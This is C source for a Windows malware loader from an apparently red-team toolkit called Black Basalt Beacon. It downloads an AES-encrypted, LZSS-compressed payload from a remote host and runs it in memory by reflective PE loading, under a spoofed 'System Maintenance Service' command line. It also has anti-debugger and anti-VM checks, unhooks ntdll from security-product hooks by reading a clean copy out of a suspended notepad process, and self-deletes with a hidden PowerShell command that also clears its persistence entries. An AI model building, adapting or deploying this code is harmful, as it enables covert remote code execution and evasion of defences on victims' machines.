/*
	This file is part of Black Basalt Beacon.

	Black Basalt Beacon is free software: you can't redistribute it and/or modify
	it under the terms of our private License as published by
	the LazyOwn RedTeam, either version 1 of the License, or
	(at your option) any later version.

	Black Basalt Beacon BOF LazyLoader is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	License for more details.

	You should have received a copy of the icense
	along with Black Basalt Beacon BOF LazyLoader.  If not, see <https://lazyown.ct.ws/>.

	Copyright (c) LazyOwn RedTeam 2025. All rights reserved.
*/
#define _CRT_RAND_S
#include <windows.h>
#include <stdio.h>
#include <psapi.h>
#include <winternl.h>
#include <winhttp.h>
#include <wincrypt.h>
#include <stdlib.h>
#include <string.h>

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#endif

#define NtCurrentThread() ((HANDLE)(LONG_PTR)-2)
#define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)

#pragma warning(disable: 4996)
#define _CRT_SECURE_NO_WARNINGS

typedef LONG NTSTATUS;

typedef struct _BASE_RELOCATION_ENTRY {
    WORD Offset : 12;
    WORD Type : 4;
} BASE_RELOCATION_ENTRY;

typedef struct {
    LPVOID data;
    size_t len;
} DATA;

// === LZSS DECOMPRESSOR (Okumura - en memoria, sin archivos) ===
#define EI 11
#define EJ  4
#define P   1
#define N (1 << EI)
#define F ((1 << EJ) + P)

typedef struct {
    const unsigned char* input;
    size_t input_size;      // en bytes
    size_t bit_index;       // índice de bit global (0 a input_size*8 - 1)
} BitReader;

static int read_bit(BitReader* br) {
    if (br->bit_index >= br->input_size * 8) {
        return -1; // EOF
    }
    size_t byte_index = br->bit_index / 8;
    int bit_in_byte = 7 - (br->bit_index % 8); // MSB first (bit 7 es el primero)
    unsigned char byte = br->input[byte_index];
    br->bit_index++;
    return (byte >> bit_in_byte) & 1;
}

static int read_bits(BitReader* br, int n) {
    int value = 0;
    for (int i = 0; i < n; i++) {
        int bit = read_bit(br);
        if (bit == -1) return -1;
        value = (value << 1) | bit;
    }
    return value;
}

BOOL lzss_decode_mem(const unsigned char* input, size_t input_size, unsigned char** output, size_t* output_size) {
    if (!input || input_size == 0 || !output || !output_size) {
        return FALSE;
    }

    BitReader br = {0};
    br.input = input;
    br.input_size = input_size;
    br.bit_index = 0;

    // Buffer circular de Okumura: N*2
    unsigned char* window = (unsigned char*)calloc(N * 2, 1);
    if (!window) {
        return FALSE;
    }
    // Inicializar con espacios
    for (int i = 0; i < N - F; i++) {
        window[i] = ' ';
    }

    // Buffer de salida dinámico
    size_t out_capacity = 4096;
    unsigned char* out_buf = (unsigned char*)malloc(out_capacity);
    if (!out_buf) {
        free(window);
        return FALSE;
    }
    size_t out_len = 0;

    int r = N - F; // posición de escritura en la ventana (0 <= r < N)

    while (1) {
        int flag = read_bit(&br);
        if (flag == -1) break; // EOF

        if (flag) {
            // Literal: 8 bits
            int c = read_bits(&br, 8);
            if (c == -1) break;

            // Asegurar espacio
            if (out_len >= out_capacity) {
                out_capacity *= 2;
                unsigned char* tmp = (unsigned char*)realloc(out_buf, out_capacity);
                if (!tmp) {
                    free(out_buf);
                    free(window);
                    return FALSE;
                }
                out_buf = tmp;
            }

            out_buf[out_len] = (unsigned char)c;
            window[r] = (unsigned char)c;
            r = (r + 1) & (N - 1); // módulo N
            out_len++;
        } else {
            // Par (offset, length)
            int offset = read_bits(&br, EI);
            int length = read_bits(&br, EJ);
            if (offset == -1 || length == -1) break;

            length += 2; // porque se codifica length-2

            // Asegurar espacio
            if (out_len + length > out_capacity) {
                while (out_capacity < out_len + length) {
                    out_capacity *= 2;
                }
                unsigned char* tmp = (unsigned char*)realloc(out_buf, out_capacity);
                if (!tmp) {
                    free(out_buf);
                    free(window);
                    return FALSE;
                }
                out_buf = tmp;
            }

            for (int k = 0; k < length; k++) {
                unsigned char c = window[(offset + k) & (N - 1)];
                out_buf[out_len] = c;
                window[r] = c;
                r = (r + 1) & (N - 1);
                out_len++;
            }
        }
    }

    free(window);
    *output = out_buf;
    *output_size = out_len;
    return TRUE;
}
// Prototipos
void DecryptAES(char* data, DWORD* pDataLen, char* key, DWORD keyLen);
DATA GetData(wchar_t* whost, DWORD port, wchar_t* wresource);
void masqueradeCmdline(void);
void freeargvA(char** array, int Argc);
void freeargvW(wchar_t** array, int Argc);
char* GetNTHeaders(char* pe_buffer);
IMAGE_DATA_DIRECTORY* GetPEDirectory(PVOID pe_buffer, size_t dir_id);
BOOL RepairIAT(PVOID modulePtr);
void PELoader(char* data, DWORD datasize);
LPVOID getNtdll(void);
BOOL Unhook(LPVOID cleanNtdll);

// Hooks
LPWSTR hookGetCommandLineW();
LPSTR hookGetCommandLineA();
char*** __cdecl hook__p___argv(void);
wchar_t*** __cdecl hook__p___wargv(void);
int* __cdecl hook__p___argc(void);
int hook__wgetmainargs(int* _Argc, wchar_t*** _Argv, wchar_t*** _Env, int _useless_, void* _useless);
int hook__getmainargs(int* _Argc, char*** _Argv, char*** _Env, int _useless_, void* _useless);
int __cdecl hookexit(int status);
void __stdcall hookExitProcess(UINT statuscode);

// Variables globales
BOOL hijackCmdline = FALSE;
char* sz_masqCmd_Ansi = NULL;
char* sz_masqCmd_ArgvAnsi[100];
wchar_t* sz_masqCmd_Widh = NULL;
wchar_t* sz_masqCmd_ArgvWidh[100];
wchar_t** poi_masqArgvW = NULL;
char** poi_masqArgvA = NULL;
int int_masqCmd_Argc = 0;
DWORD dwTimeout = 0;

BYTE* pImageBase = NULL;
IMAGE_NT_HEADERS* ntHeader = NULL;

// Implementación de hooks
LPWSTR hookGetCommandLineW() { return sz_masqCmd_Widh; }
LPSTR hookGetCommandLineA() { return sz_masqCmd_Ansi; }
char*** __cdecl hook__p___argv(void) { return &poi_masqArgvA; }
wchar_t*** __cdecl hook__p___wargv(void) { return &poi_masqArgvW; }
int* __cdecl hook__p___argc(void) { return &int_masqCmd_Argc; }
void selfDestruct();


// === ANTI-ANALYSIS ===
BOOL anti_analysis() {
    if (IsDebuggerPresent()) return TRUE;

    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char buffer[256];
        DWORD size = sizeof(buffer);
        if (RegQueryValueExA(hKey, "SystemBiosVersion", NULL, NULL, (LPBYTE)buffer, &size) == ERROR_SUCCESS) {
            if (strstr(buffer, "VMWARE") || strstr(buffer, "VBOX") || strstr(buffer, "QEMU") || strstr(buffer, "XEN")) {
                RegCloseKey(hKey);
                return TRUE;
            }
        }
        RegCloseKey(hKey);
    }

    if (GetTickCount() < 60000) return TRUE;

    MEMORYSTATUSEX mem;
    mem.dwLength = sizeof(mem);
    if (GlobalMemoryStatusEx(&mem) && mem.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) return TRUE;

    return FALSE;
}

void selfDestruct() {
    printf("[*] Initiating self-destruct...\n");
    fflush(stdout);
    
    char exePath[MAX_PATH];
    if (!GetModuleFileNameA(NULL, exePath, MAX_PATH)) {
        printf("[-] Failed to get executable path\n");
        return;
    }
    
    // Eliminar del registro
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, 
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
        0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, "SystemMaintenance");
        RegCloseKey(hKey);
    }
    
    // Eliminar tarea programada
    system("schtasks /delete /tn \"SystemMaintenanceTask\" /f > nul 2>&1");
    
    // Preparar comando PowerShell robusto, ESCAPADO PARA BASH
    char cmd[2048];
    snprintf(cmd, sizeof(cmd),
        "cmd.exe /c "
        "timeout /t 3 > nul & "
        "powershell -Command \""
            "$ErrorActionPreference='SilentlyContinue'; "
            "for($i=0; $i -lt 5; $i++){ "
                "Start-Sleep -Seconds 2; "
                "try{ Remove-Item -Force -Path '%s' -ErrorAction Stop; exit } catch{} "
            "}; "
            "Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'SystemMaintenance' -ErrorAction SilentlyContinue"
        "\" > nul 2>&1",
        exePath);
    
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    
    if (CreateProcessA(NULL, cmd, NULL, NULL, FALSE, 
                      CREATE_NO_WINDOW | DETACHED_PROCESS,
                      NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    } else {
        printf("[-] Failed to spawn cleanup process\n");
    }
    
    printf("[+] Self-destruct sequence activated. Exiting now...\n");
    fflush(stdout);
    
    ExitProcess(0);
}

int hook__wgetmainargs(int* _Argc, wchar_t*** _Argv, wchar_t*** _Env, int _useless_, void* _useless) {
    *_Argc = int_masqCmd_Argc;
    *_Argv = poi_masqArgvW;
    return 0;
}

int hook__getmainargs(int* _Argc, char*** _Argv, char*** _Env, int _useless_, void* _useless) {
    *_Argc = int_masqCmd_Argc;
    *_Argv = poi_masqArgvA;
    return 0;
}

int __cdecl hookexit(int status) {
    ExitThread(0);
    return 0;
}

void __stdcall hookExitProcess(UINT statuscode) {
    ExitThread(0);
}

void masqueradeCmdline() {
    int required_size = MultiByteToWideChar(CP_UTF8, 0, sz_masqCmd_Ansi, -1, NULL, 0);
    sz_masqCmd_Widh = (wchar_t*)calloc(required_size + 1, sizeof(wchar_t));
    if (!sz_masqCmd_Widh) return;
    MultiByteToWideChar(CP_UTF8, 0, sz_masqCmd_Ansi, -1, sz_masqCmd_Widh, required_size);

    poi_masqArgvW = CommandLineToArgvW(sz_masqCmd_Widh, &int_masqCmd_Argc);
    if (!poi_masqArgvW) {
        free(sz_masqCmd_Widh);
        return;
    }

    int retval;
    int memsize = int_masqCmd_Argc * sizeof(LPSTR);
    for (int i = 0; i < int_masqCmd_Argc; ++i) {
        retval = WideCharToMultiByte(CP_UTF8, 0, poi_masqArgvW[i], -1, NULL, 0, NULL, NULL);
        memsize += retval;
    }

    poi_masqArgvA = (LPSTR*)LocalAlloc(LMEM_FIXED, memsize);
    if (!poi_masqArgvA) {
        LocalFree(poi_masqArgvW);
        free(sz_masqCmd_Widh);
        return;
    }

    int bufLen = memsize - int_masqCmd_Argc * sizeof(LPSTR);
    LPSTR buffer = ((LPSTR)poi_masqArgvA) + int_masqCmd_Argc * sizeof(LPSTR);
    for (int i = 0; i < int_masqCmd_Argc; ++i) {
        retval = WideCharToMultiByte(CP_UTF8, 0, poi_masqArgvW[i], -1, buffer, bufLen, NULL, NULL);
        poi_masqArgvA[i] = buffer;
        buffer += retval;
        bufLen -= retval;
    }

    hijackCmdline = TRUE;
}

void freeargvA(char** array, int Argc) {
    if (!array) return;
    for (int i = 0; i < Argc; i++) {
        if (array[i]) memset(array[i], 0, strlen(array[i]));
    }
    LocalFree(array);
}

void freeargvW(wchar_t** array, int Argc) {
    if (!array) return;
    for (int i = 0; i < Argc; i++) {
        if (array[i]) memset(array[i], 0, wcslen(array[i]) * 2);
    }
    LocalFree(array);
}

char* GetNTHeaders(char* pe_buffer) {
    if (!pe_buffer) return NULL;
    IMAGE_DOS_HEADER* idh = (IMAGE_DOS_HEADER*)pe_buffer;
    if (idh->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
    const LONG kMaxOffset = 1024;
    LONG pe_offset = idh->e_lfanew;
    if (pe_offset > kMaxOffset) return NULL;
    IMAGE_NT_HEADERS32* inh = (IMAGE_NT_HEADERS32*)(pe_buffer + pe_offset);
    if (inh->Signature != IMAGE_NT_SIGNATURE) return NULL;
    return (char*)inh;
}

IMAGE_DATA_DIRECTORY* GetPEDirectory(PVOID pe_buffer, size_t dir_id) {
    if (dir_id >= IMAGE_NUMBEROF_DIRECTORY_ENTRIES) return NULL;
    char* nt_headers = GetNTHeaders((char*)pe_buffer);
    if (!nt_headers) return NULL;
    IMAGE_NT_HEADERS* nt_header = (IMAGE_NT_HEADERS*)nt_headers;
    IMAGE_DATA_DIRECTORY* peDir = &(nt_header->OptionalHeader.DataDirectory[dir_id]);
    if (peDir->VirtualAddress == 0) return NULL;
    return peDir;
}

BOOL RepairIAT(PVOID modulePtr) {
    IMAGE_DATA_DIRECTORY* importsDir = GetPEDirectory(modulePtr, IMAGE_DIRECTORY_ENTRY_IMPORT);
    if (!importsDir) return FALSE;

    size_t maxSize = importsDir->Size;
    size_t impAddr = importsDir->VirtualAddress;
    IMAGE_IMPORT_DESCRIPTOR* lib_desc = NULL;
    size_t parsedSize = 0;

    for (; parsedSize < maxSize; parsedSize += sizeof(IMAGE_IMPORT_DESCRIPTOR)) {
        lib_desc = (IMAGE_IMPORT_DESCRIPTOR*)((char*)modulePtr + impAddr + parsedSize);
        if (lib_desc->OriginalFirstThunk == 0 && lib_desc->FirstThunk == 0) break;
        LPSTR lib_name = (LPSTR)((char*)modulePtr + lib_desc->Name);
        if (!lib_name) continue;

        size_t call_via = lib_desc->FirstThunk;
        size_t thunk_addr = lib_desc->OriginalFirstThunk ? lib_desc->OriginalFirstThunk : lib_desc->FirstThunk;
        if (!thunk_addr) continue;

        size_t offsetField = 0;
        size_t offsetThunk = 0;

        while (1) {
            IMAGE_THUNK_DATA* fieldThunk = (IMAGE_THUNK_DATA*)((char*)modulePtr + call_via + offsetField);
            IMAGE_THUNK_DATA* orginThunk = (IMAGE_THUNK_DATA*)((char*)modulePtr + thunk_addr + offsetThunk);

            if (orginThunk->u1.AddressOfData == 0) break;

            if (IMAGE_SNAP_BY_ORDINAL(orginThunk->u1.Ordinal)) {
                FARPROC addr = GetProcAddress(LoadLibraryA(lib_name), (LPCSTR)IMAGE_ORDINAL(orginThunk->u1.Ordinal));
                fieldThunk->u1.Function = (ULONG_PTR)addr;
            } else {
                PIMAGE_IMPORT_BY_NAME by_name = (PIMAGE_IMPORT_BY_NAME)((char*)modulePtr + orginThunk->u1.AddressOfData);
                if (!by_name) break;
                LPSTR func_name = (LPSTR)by_name->Name;
                if (!func_name) break;

                FARPROC addr = GetProcAddress(LoadLibraryA(lib_name), func_name);

                if (hijackCmdline && _stricmp(func_name, "GetCommandLineA") == 0) {
                    fieldThunk->u1.Function = (ULONG_PTR)hookGetCommandLineA;
                } else if (hijackCmdline && _stricmp(func_name, "GetCommandLineW") == 0) {
                    fieldThunk->u1.Function = (ULONG_PTR)hookGetCommandLineW;
                } else if (hijackCmdline && _stricmp(func_name, "__wgetmainargs") == 0) {
                    fieldThunk->u1.Function = (ULONG_PTR)hook__wgetmainargs;
                } else if (hijackCmdline && _stricmp(func_name, "__getmainargs") == 0) {
                    fieldThunk->u1.Function = (ULONG_PTR)hook__getmainargs;
                } else if (hijackCmdline && _stricmp(func_name, "__p___argv") == 0) {
                    fieldThunk->u1.Function = (ULONG_PTR)hook__p___argv;
                } else if (hijackCmdline && _stricmp(func_name, "__p___wargv") == 0) {
                    fieldThunk->u1.Function = (ULONG_PTR)hook__p___wargv;
                } else if (hijackCmdline && _stricmp(func_name, "__p___argc") == 0) {
                    fieldThunk->u1.Function = (ULONG_PTR)hook__p___argc;
                } else if (hijackCmdline && (
                    _stricmp(func_name, "exit") == 0 ||
                    _stricmp(func_name, "_Exit") == 0 ||
                    _stricmp(func_name, "_exit") == 0 ||
                    _stricmp(func_name, "quick_exit") == 0)) {
                    fieldThunk->u1.Function = (ULONG_PTR)hookexit;
                } else if (hijackCmdline && _stricmp(func_name, "ExitProcess") == 0) {
                    fieldThunk->u1.Function = (ULONG_PTR)hookExitProcess;
                } else {
                    fieldThunk->u1.Function = (ULONG_PTR)addr;
                }
            }

            if (fieldThunk->u1.Function == 0) break;

            offsetField += sizeof(IMAGE_THUNK_DATA);
            offsetThunk += sizeof(IMAGE_THUNK_DATA);
        }
    }
    return TRUE;
}

DWORD WINAPI RunPE(LPVOID lpParameter) {
    void (*entryPoint)() = (void(*)())lpParameter;
    entryPoint();
    return 0;
}

void PELoader(char* data, DWORD datasize) {
    if (!data || datasize == 0) return;

    masqueradeCmdline();

    IMAGE_NT_HEADERS* ntHeader = (IMAGE_NT_HEADERS*)GetNTHeaders(data);
    if (!ntHeader) {
        printf("[-] Invalid PE header\n");
        return;
    }

    IMAGE_DATA_DIRECTORY* relocDir = GetPEDirectory(data, IMAGE_DIRECTORY_ENTRY_BASERELOC);
    LPVOID preferAddr = (LPVOID)ntHeader->OptionalHeader.ImageBase;

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (ntdll) {
        typedef NTSTATUS (NTAPI *NtUnmapViewOfSection_t)(HANDLE, PVOID);
        NtUnmapViewOfSection_t NtUnmapViewOfSection = (NtUnmapViewOfSection_t)GetProcAddress(ntdll, "NtUnmapViewOfSection");
        if (NtUnmapViewOfSection) {
            NtUnmapViewOfSection(NtCurrentProcess(), preferAddr);
        }
    }

    BYTE* pImageBase = (BYTE*)VirtualAlloc(preferAddr, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pImageBase && relocDir) {
        pImageBase = (BYTE*)VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    }
    if (!pImageBase) {
        printf("[-] VirtualAlloc failed\n");
        return;
    }

    ntHeader->OptionalHeader.ImageBase = (ULONG_PTR)pImageBase;
    memcpy(pImageBase, data, ntHeader->OptionalHeader.SizeOfHeaders);

    IMAGE_SECTION_HEADER* SectionHeaderArr = (IMAGE_SECTION_HEADER*)((char*)ntHeader + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + ntHeader->FileHeader.SizeOfOptionalHeader);
    for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
        if (SectionHeaderArr[i].PointerToRawData + SectionHeaderArr[i].SizeOfRawData > datasize) {
            printf("[-] Section %d exceeds file bounds\n", i);
            VirtualFree(pImageBase, 0, MEM_RELEASE);
            return;
        }
        memcpy(pImageBase + SectionHeaderArr[i].VirtualAddress,
               data + SectionHeaderArr[i].PointerToRawData,
               SectionHeaderArr[i].SizeOfRawData);
    }

    if (!RepairIAT(pImageBase)) {
        printf("[-] Failed to repair IAT\n");
        VirtualFree(pImageBase, 0, MEM_RELEASE);
        return;
    }

    ULONG_PTR entryRVA = ntHeader->OptionalHeader.AddressOfEntryPoint;
    if (entryRVA == 0) {
        printf("[-] No entry point found\n");
        VirtualFree(pImageBase, 0, MEM_RELEASE);
        return;
    }

    ULONG_PTR entryPoint = (ULONG_PTR)pImageBase + entryRVA;
    printf("[+] Starting PE at %p...\n", (void*)entryPoint);

    HANDLE hThread = CreateThread(NULL, 0, RunPE, (LPVOID)entryPoint, 0, NULL);
    if (hThread) {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    } else {
        printf("[-] CreateThread failed (%u)\n", GetLastError());
        void (*ep)() = (void(*)())entryPoint;
        ep();
    }
}

LPVOID getNtdll() {
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    if (!CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("[-] CreateProcessA failed (%u)\n", GetLastError());
        return NULL;
    }

    MODULEINFO mi = {0};
    HMODULE ntdllMod = GetModuleHandleA("ntdll.dll");
    if (!GetModuleInformation(GetCurrentProcess(), ntdllMod, &mi, sizeof(mi))) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return NULL;
    }

    LPVOID localNtdll = malloc(mi.SizeOfImage);
    if (!localNtdll) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return NULL;
    }

    SIZE_T bytesRead = 0;
    if (!ReadProcessMemory(pi.hProcess, mi.lpBaseOfDll, localNtdll, mi.SizeOfImage, &bytesRead)) {
        printf("[-] ReadProcessMemory failed (%u)\n", GetLastError());
        free(localNtdll);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return NULL;
    }

    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return localNtdll;
}

BOOL Unhook(LPVOID cleanNtdll) {
    if (!cleanNtdll) return FALSE;

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)cleanNtdll;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((char*)cleanNtdll + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(sec[i].Name, ".text", 5) == 0) {
            DWORD oldProtect = 0;
            LPVOID target = (char*)hNtdll + sec[i].VirtualAddress;
            SIZE_T size = sec[i].Misc.VirtualSize;

            if (!VirtualProtect(target, size, PAGE_EXECUTE_READWRITE, &oldProtect)) {
                printf("[-] VirtualProtect failed (%u)\n", GetLastError());
                return FALSE;
            }

            memcpy(target, (char*)cleanNtdll + sec[i].VirtualAddress, size);

            if (!VirtualProtect(target, size, oldProtect, &oldProtect)) {
                printf("[-] VirtualProtect restore failed (%u)\n", GetLastError());
                return FALSE;
            }

            printf("[+] .text section restored\n");
            return TRUE;
        }
    }

    return FALSE;
}

void DecryptAES(char* data, DWORD* pDataLen, char* key, DWORD keyLen) {
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    HCRYPTKEY hKey = 0;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return;
    }
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        goto cleanup;
    }
    if (!CryptHashData(hHash, (BYTE*)key, keyLen, 0)) {
        goto cleanup;
    }
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        goto cleanup;
    }

    BYTE iv[16] = {0};
    CryptSetKeyParam(hKey, KP_IV, iv, 0);

    // ¡Ahora usamos pDataLen!
    if (!CryptDecrypt(hKey, 0, TRUE, 0, (BYTE*)data, pDataLen)) {
        printf("[-] CryptDecrypt failed: %u\n", GetLastError());
        goto cleanup;
    }

cleanup:
    if (hKey) CryptDestroyKey(hKey);
    if (hHash) CryptDestroyHash(hHash);
    if (hProv) CryptReleaseContext(hProv, 0);
}

DATA GetData(wchar_t* whost, DWORD port, wchar_t* wresource) {
    DATA data = {0};
    unsigned char* buffer = NULL;
    size_t buffer_capacity = 0;
    size_t buffer_size = 0;

    // Log para depuración
    {
        char resourceA[1024] = {0};
        WideCharToMultiByte(CP_UTF8, 0, wresource, -1, resourceA, sizeof(resourceA)-1, NULL, NULL);
        printf("[*] Descargando: %ls (%s)\n", wresource, resourceA);
    }

    HINTERNET hSession = WinHttpOpen(L"WinHTTP Example/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        printf("[-] WinHttpOpen failed (%u)\n", GetLastError());
        return data;
    }

    HINTERNET hConnect = WinHttpConnect(hSession, whost, port, 0);
    if (!hConnect) {
        printf("[-] WinHttpConnect failed (%u)\n", GetLastError());
        WinHttpCloseHandle(hSession);
        return data;
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", wresource, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) {
        printf("[-] WinHttpOpenRequest failed (%u)\n", GetLastError());
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return data;
    }

    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
        printf("[-] WinHttpSendRequest failed (%u)\n", GetLastError());
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return data;
    }

    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        printf("[-] WinHttpReceiveResponse failed (%u)\n", GetLastError());
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return data;
    }

    DWORD dwSize = 0;
    while (WinHttpQueryDataAvailable(hRequest, &dwSize) && dwSize > 0) {
        char* pszOutBuffer = (char*)malloc(dwSize + 1);
        if (!pszOutBuffer) {
            printf("[-] malloc failed\n");
            break;
        }
        ZeroMemory(pszOutBuffer, dwSize + 1);

        DWORD dwDownloaded = 0;
        if (!WinHttpReadData(hRequest, pszOutBuffer, dwSize, &dwDownloaded)) {
            printf("[-] WinHttpReadData failed (%u)\n", GetLastError());
            free(pszOutBuffer);
            break;
        }

        if (buffer_size + dwDownloaded > buffer_capacity) {
            size_t new_capacity = (buffer_size + dwDownloaded) * 2;
            unsigned char* new_buffer = (unsigned char*)realloc(buffer, new_capacity);
            if (!new_buffer) {
                printf("[-] realloc failed\n");
                free(pszOutBuffer);
                break;
            }
            buffer = new_buffer;
            buffer_capacity = new_capacity;
        }

        memcpy(buffer + buffer_size, pszOutBuffer, dwDownloaded);
        buffer_size += dwDownloaded;
        free(pszOutBuffer);
        dwSize = 0;
    }

    if (buffer_size == 0) {
        printf("[-] No data downloaded\n");
    } else {
        data.data = malloc(buffer_size);
        if (data.data) {
            memcpy(data.data, buffer, buffer_size);
            data.len = buffer_size;
            printf("[+] Descargado: %zu bytes\n", buffer_size);
        }
    }

    if (buffer) free(buffer);
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return data;
}

int main(int argc, char** argv) {
    srand(GetTickCount());

    // Anti-analysis
    if (anti_analysis()) return 1;

    if (argc != 4) {
        printf("[+] Usage: %s <Host> <Port> <Resource>\n", argv[0]);
        return 1;
    }

    char* host = argv[1];
    DWORD port = atoi(argv[2]);
    char* resource = argv[3];

    // Convertir a wchar_t
    int len = MultiByteToWideChar(CP_UTF8, 0, host, -1, NULL, 0);
    wchar_t* whost = (wchar_t*)malloc(len * sizeof(wchar_t));
    MultiByteToWideChar(CP_UTF8, 0, host, -1, whost, len);

    len = MultiByteToWideChar(CP_UTF8, 0, resource, -1, NULL, 0);
    wchar_t* wresource = (wchar_t*)malloc(len * sizeof(wchar_t));
    MultiByteToWideChar(CP_UTF8, 0, resource, -1, wresource, len);

    printf("\n[+] Descargando payload de %s:%d/%s\n", host, port, resource);
    DATA payload = GetData(whost, port, wresource);
    if (!payload.data || payload.len < 12) {
        printf("[-] Error al descargar el payload\n");
        goto cleanup;
    }

    // Parsear payload: [keyLen][key][peSize][cipherLen][cipher]
    if (payload.len < 4) goto invalid;
    DWORD keyLen = *(DWORD*)payload.data;
    if (keyLen == 0 || keyLen > 1024 || 4 + keyLen + 8 > payload.len) goto invalid;

    char* key = (char*)payload.data + 4;
    DWORD peOriginalSize = *(DWORD*)(payload.data + 4 + keyLen);
    DWORD cipherLen = *(DWORD*)(payload.data + 4 + keyLen + 4);
    if (4 + keyLen + 8 + cipherLen != payload.len) goto invalid;

    char* cipher = (char*)payload.data + 4 + keyLen + 8;

    printf("[+] KeyLen: %u | PE Original: %u | Cipher: %u\n", keyLen, peOriginalSize, cipherLen);

    // === DESCIFRAR ===
    DWORD decryptedLen = cipherLen;
    DecryptAES(cipher, &decryptedLen, key, keyLen);
    // === DESCOMPRIMIR LZSS ===
    unsigned char* decompressed = NULL;
    size_t decompSize = 0;
    if (!lzss_decode_mem((unsigned char*)cipher, decryptedLen, &decompressed, &decompSize)) {
        printf("[-] LZSS decompression failed\n");
        goto cleanup;
    }

    printf("[+] LZSS: %zu bytes -> PE: %zu bytes (esperado: %u)\n", decryptedLen, decompSize, peOriginalSize);

    // === EJECUTAR ===
    sz_masqCmd_Ansi = "System Maintenance Service"; // mejor camuflaje
    PELoader((char*)decompressed, (DWORD)decompSize);

    printf("\n[+] Finalizado\n");

cleanup:
    free(whost);
    free(wresource);
    if (payload.data) free(payload.data);
    Sleep(3000);
    selfDestruct();
    return 0;

invalid:
    printf("[-] Invalid payload format\n");
    goto cleanup;
}